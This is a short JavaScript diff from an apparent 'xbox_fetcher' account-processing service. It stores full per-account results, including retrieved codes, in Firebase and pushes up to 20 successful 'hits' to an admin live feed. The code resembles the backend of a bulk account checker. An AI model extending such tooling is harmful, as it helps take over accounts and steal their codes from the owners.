@@ -442,19 +442,28 @@ async function processAccountsBackground(
     timestamp: Date.now()
   }).catch(() => {});
 
-  // Save to Firebase
+  // Save FULL results (including all codes) to Firebase history
   if (userId) {
-    await firebasePush(`checkHistory/${userId}`, { 
+    // Filter non-null results and create full result entries
+    const fullResults = results.filter(r => r != null).map(r => ({
+      email: r.email,
+      status: r.status,
+      codes: r.codes || [],
+      message: r.message
+    }));
+
+    await firebasePush(`users/${userId}/checkHistory`, { 
       service: "xbox_fetcher", 
       inputCount: total, 
       stats, 
+      results: fullResults,
       duration,
       createdAt: new Date().toISOString() 
-    }).catch(() => {});
+    }).catch(e => log(`Failed to save history: ${e}`));
     
-    // Push live hits
+    // Push live hits for admin feed (limit to 20)
     const hits = results.filter(r => r?.status === 'success' && r.codes.length > 0);
-    for (const hit of hits.slice(0, 10)) {
+    for (const hit of hits.slice(0, 20)) {
       await firebasePush('adminData/liveHits', { 
         service: 'xbox_fetcher', 
         username: username || 'anon', 
